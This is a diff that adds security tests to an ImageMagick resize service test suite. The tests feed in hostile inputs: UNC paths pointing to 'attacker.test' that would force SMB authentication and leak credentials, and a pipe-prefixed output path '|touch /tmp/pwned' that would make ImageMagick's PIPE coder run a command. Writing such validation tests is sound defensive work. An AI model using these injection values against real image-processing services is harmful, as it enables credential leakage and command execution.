@@ -132,6 +132,27 @@ component extends="tests.resources.baseTest" {
                 )).toThrow('ImageMagick.InputValidationException');
             });
 
+            it('Throws for a path using a UNC network path (SSRF/credential-leak via forced SMB auth)', () => {
+                expect(() => imageService.resize(
+                    path    = '\\attacker.test\share\evil.jpg',
+                    outputs = [{resizeDir: newDir(), width: 100}]
+                )).toThrow('ImageMagick.InputValidationException');
+            });
+
+            it('Throws when an output resizeDir is a UNC network path', () => {
+                expect(() => imageService.resize(
+                    path    = expandPath('/tests/resources/jpg_example.jpg'),
+                    outputs = [{resizeDir: '\\attacker.test\share', width: 100}]
+                )).toThrow('ImageMagick.InputValidationException');
+            });
+
+            it('Throws when an output resizeDir starts with a pipe (ImageMagick PIPE coder command execution)', () => {
+                expect(() => imageService.resize(
+                    path    = expandPath('/tests/resources/jpg_example.jpg'),
+                    outputs = [{resizeDir: '|touch /tmp/pwned', width: 100}]
+                )).toThrow('ImageMagick.InputValidationException');
+            });
+
             it('Throws when an output is missing both width and height', () => {
                 expect(() => imageService.resize(
                     path    = expandPath('/tests/resources/jpg_example.jpg'),
